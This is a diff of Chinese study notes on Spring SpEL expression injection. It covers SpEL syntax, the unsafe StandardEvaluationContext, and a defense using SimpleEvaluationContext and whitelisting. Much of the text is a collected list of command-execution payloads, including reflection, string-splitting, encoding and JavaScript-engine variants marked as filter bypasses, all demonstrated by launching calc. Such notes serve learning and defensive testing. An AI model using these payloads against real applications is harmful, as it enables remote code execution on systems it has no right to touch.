@@ -8,7 +8,8 @@ ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEng
 
 
 ^
-# **Spring的SpEL表达式注入**
+# **Spring的SpEL表达式**
+功能：
 ```
 把字符串当做代码执行。
 数学表达式执行。
@@ -17,8 +18,42 @@ SpEL通常用在Spring框架的某些特定场景中，比如
 在配置文件中通过`${...}`使用属性占位符，或者在注解中实现复杂的逻辑，例如`@Conditional`注解。
 ```
 
+集成：
+存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
+```
 当集成的spring-boot-starter-web依赖后，就可以自动使用。
+org.springframework.expression.spel.standard
+SpelExpressionParser
+parseExpression
+expression.getValue();
+expression.setValue();
+```
+SpEl解析SpEL提供了两套不同的接口，分别是"SimpleEvaluationContext"和"StandardEvaluationContext"。
+"SimpleEvaluationContext" 仅支持简单的表达式，抛弃了Java类型引用，构造函数，相较比较安全。
+而"StandardEvaluationContext" 支持复杂的表达式，如方法调用、属性访问等。 
+如果在不指定EvaluationContext的情况下，SpEl默认使用"StandardEvaluationContext"。
+
 关键词：StandardEvaluationContext()；
+
+^
+## **使用**
+SpEL的用法有三种形式
+1、是在注解@Value中；
+2、是XML配置；
+3、在代码中使用Expression。
+```
+SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。
+#{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
+${}主要用于加载外部属性文件中的值；
+两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的；
+```
+```
+在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。
+使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。
+T(Runtime).getRuntime().exec('calc')
+```
+
+案例：
 ```
 String spel ="T(java.lang.Runtime).getRuntime().exec(\"calc\")"; 
 //T()包裹后可以直接调用静态方法和静态属性。
@@ -30,12 +65,12 @@ expression.getValue(context);
 ```
 
 CVE复现：<https://cloud.tencent.com/developer/article/2144995>
-防御：使用时做白名单，只有需要的字符串才能当作代码执行。
 
 
 
 
-### SpEL表达式 #{} 和 {} 和 # 和 '' 的使用
+^
+### **SpEL表达式 #{} 和 {} 和 # 的使用用法**
 1. #{} 表达式
    #{} 用于在 Spring 配置文件中表示需要解析的 SpEL 表达式。主要用于注解、XML 配置和属性文件中，通常在需要动态计算的场景下使用。
 ```java 
@@ -57,38 +92,86 @@ Integer number = parser.parseExpression("#number").getValue(context, Integer.cla
 SpelExpressionParser parser = new SpelExpressionParser();
 String result = parser.parseExpression("'Hello ' + 'World'").getValue(String.class);
 ```
-4. `{}`   
-    花括号 {} 通常用于在集合、数组或映射中表示集合字面量。以下是一些具体的用法和示例。
-### Spel注入  
-存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
-```java
-org.springframework.expression.spel.standard
-SpelExpressionParser
-parseExpression
-expression.getValue();
-expression.setValue();
+
+
+
+ 
+^
+## **SpEL表达式注入payload**
 ```
- SpEl解析SpEL提供了两套不同的接口，分别是"SimpleEvaluationContext"和"StandardEvaluationContext"。其中"SimpleEvaluationContext" 
- 仅支持简单的表达式，抛弃了Java类型引用，构造函数，相较比较安全。而"StandardEvaluationContext" 支持复杂的表达式，如方法调用、属性访问等。
- 如果在不指定EvaluationContext的情况下，SpEl默认使用"StandardEvaluationContext"。
- ```java
 // 执行exec
 T(java.lang.Runtime).getRuntime().exec("calc.exe");
 #this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe");
 
  ```
-
-### 构造payload
 ```
 T(java.lang.Ru" + "ntime).getRuntime().exec('calc');
+
 String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";
+
 new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')")";
+
 T(java.lang.Runtime).getRuntime().exec("calc")
 T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))
 ```
+更多
+```
+// PoC原型
 
-## Spel 防御
+// Runtime
+T(java.lang.Runtime).getRuntime().exec("calc")
+T(Runtime).getRuntime().exec("calc")
+
+// ProcessBuilder
+new java.lang.ProcessBuilder({'calc'}).start()
+new ProcessBuilder({'calc'}).start()
+
+******************************************************************************
+// Bypass技巧
+
+// 反射调用
+T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+
+// 同上，需要有上下文环境
+#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+
+// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
+T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
+
+// 同上，需要有上下文环境
+#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
+// byte数组内容的生成后面有脚本
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
+// byte数组内容的生成后面有脚本
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+
+// JavaScript引擎通用PoC
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
+
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
+
+// JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
+
+// JavaScript引擎+URL编码
+// 其中URL编码内容为：
+// 不加最后的getInputStream()也行，因为弹计算器不需要回显
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
+
+// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功
+''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
+
+// JDK9新增的shell，还未测试
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+```
+
+## **SpEL表达式注入防御**
 使用 SimpleEvaluationContext
+防御：使用时做白名单，只有需要的字符串才能当作代码执行。
 ```java
 SpelExpressionParser parser = new SpelExpressionParser();
 SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
